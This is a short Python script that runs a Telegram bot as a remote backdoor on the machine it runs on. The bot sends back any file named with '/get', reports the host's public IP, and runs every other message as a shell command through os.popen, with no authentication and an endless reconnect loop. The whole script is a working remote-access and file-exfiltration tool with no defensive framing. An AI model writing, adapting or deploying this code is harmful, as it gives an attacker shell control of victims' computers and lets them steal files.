import telebot, requests, os, time
token = '<token>'
bot = telebot.TeleBot(token)
@bot.message_handler(content_types=['text'])
def handle(message):
    if message.text.startswith('/get '):
        filename = message.text.replace('/get ', '', 1)
        if os.path.exists(filename):
          with open(filename, 'rb') as file:
              bot.send_document(message.chat.id, file, visible_file_name=filename)
        else:
             bot.send_message(message.chat.id, 'File is not exists.')
    elif message.text == '/ip':
        bot.send_message(message.chat.id, requests.get('https://ifconfig.me/ip').text)
    else:
        try:
            bot.send_message(message.chat.id, os.popen(message.text).read())
        except Exception as e:
            bot.send_message(message.chat.id, f'Error: {e}.')
while True:
    try:
        bot.polling()
    except:
        time.sleep(2)
